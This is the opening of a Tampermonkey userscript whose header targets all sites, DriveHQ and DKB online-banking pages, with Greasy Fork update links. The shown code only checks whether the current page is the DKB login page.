// ==UserScript==
// @name         ED Rec Combined D Johannes Maria Rümpker
// @namespace    http://tampermonkey.net/
// @version      11.0
// @description  D und Amadeus Rep
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        https://www.ib.dkb.de/*
// @match        https://banking.dkb.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487413/ED%20Rec%20Combined%20D%20Johannes%20Maria%20R%C3%BCmpker.user.js
// @updateURL https://update.greasyfork.org/scripts/487413/ED%20Rec%20Combined%20D%20Johannes%20Maria%20R%C3%BCmpker.meta.js
// ==/UserScript==




    'use strict';

       // Check if on the login page
    const isLoginPage = window.location.href.indexOf('https://banking.dkb.de/login') !== -1;

  